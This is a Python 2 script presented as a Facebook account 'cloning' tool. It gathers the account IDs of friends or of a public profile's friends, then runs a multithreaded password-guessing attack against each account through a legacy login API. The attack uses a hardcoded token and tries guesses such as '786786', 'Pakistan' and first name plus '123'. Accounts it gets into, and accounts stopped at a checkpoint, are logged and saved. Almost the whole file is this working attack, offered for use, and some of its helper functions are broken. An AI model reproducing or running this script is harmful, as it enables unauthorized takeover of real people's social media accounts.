#!/usr/bin/python
# coding=utf-8
# Originally Written By:ASAD X DANISH
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 hop.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def hopss(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### LOGO #####
banner = """
\x1b[1;91m  _________________________________________________
\x1b[1;92m ASAD ANSAARI ON FIRE  
\x1b[1;93m HATERZ MAKE ME FAMOUS 
\x1b[1;94m 909 ST0P PH4D3B44Z 4S4D 49S44R1 09 F1R3
\x1b[1;95m FB ID ;ASAD ANSARI 
\x1b[1;91m 
\x1b[1;93m                     (FREEDOM FIGHTER)
\x1b[1;94m-----------°°°°°°°°°------------°°°°°°°°°-----
\x1b[1;98m➣ Coder   : ASAD ANSAARI
\x1b[1;97m➣ Github  : HTTPS://GITHUB.COM/VIRUSMAKERKINGASAD
\x1b[1;96m➣ Facebook:  ASAD ANSARI
\x1b[1;95m➣ Whatsapp: 03214598890
\x1b[1;94m----------°°°°°°°°°------------°°°°°°°°°----"""
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []
			
#Menu
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 hop.py')
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 hop.py')
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		time.sleep(1)
		('python2 hop.py')
	os.system("clear")
	print banner
	print "|[✓] Name: "+name
	print "|[✓] ID  : "+id
	print (47*"-")
	print "[1] Start Cloning."
	print "[2] Logout"
	print ('                  ')
	men()

def men():
	rana = raw_input("Choose Option >>  ")
	if rana =="":
		print " Wrong Input"
		men()
	elif rana =="1":
		crack()
	elif rana =="2":
	    os.system('clear')
	    hamza('[!] Please Wait While Page Is Loding.')
	    hopss('10%...')
	    hopss('20%...')
	    hopss('50%...')
	    hopss('70%...')
	    hopss('90%...')
	    hopss('99%...')
	    os.system('python2 .choice.py')
	    time.sleep(1)
	elif rana =="3":
		grab()
	elif rana =="4":
		bot()
	elif rana =="5":
		os.system('clear')
		print banner
		hamza('[✓] Please Wait While Tool Is Updating')
		os.system('git pull origin master')
		hamza('[✓] Tool Has Been Update Successfully')
		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
		time.sleep(3)
		os.hamza('python2 hop.py')
	elif rana =="6":
		os.system('xdg-open https://www.youtube.com/channel/UCpfLeE7qhqT73fQ9DQz9O5g')
		menu()
	elif rana =="7":
		os.system('rm -rf login.txt')
		hamza('[✓] Logged Out Successfully')
		os.system('python2 hop.py')
	else:
		print "[!] Wrong Input"
		men()
	
##### INFO #####
def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 hop.py')
	os.system('clear')
	print banner
	print "[1] Clone From Friendlist."
	print "[2] Clone From Any Public ID."
	print "[3] Clone From File."
	print "[0] Back."
	crack_menu()

def crack_menu():
	crm = raw_input("Choose Option >>  ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		print banner
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			hamza('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("\nPress Enter To Back  ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif crm =="3":
	    os.system('clear')
	    print banner
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         crack()
	   
	        
	        
	elif crm =="0":
		menu()
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        hamza('[✓] Total Friends: '+str(len(id)))
        time.sleep(0.5)
	hamza('[✓] The Process Has Been Started.')
	time.sleep(0.5)
        hamza('[!] To Stop Process Press CTRL Then Z')
        time.sleep(0.5)
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			pass1='786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = '789789'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(user+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(user+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
															crt = open("save/checkpoint.txt", "a")
															crt.write(user+"|"+pass6+"\n")
															crt.close()
															checkpoint.append(user+pass6)
														else:
															pass7 = '000786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
																	crt = open("save/checkpoint.txt", "a")
																	crt.write(user+"|"+pass7+"\n")
																	crt.close()
																	checkpoint.append(user+pass7)           					
								                                       
				                                                                           
	
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	menu()	
	
 
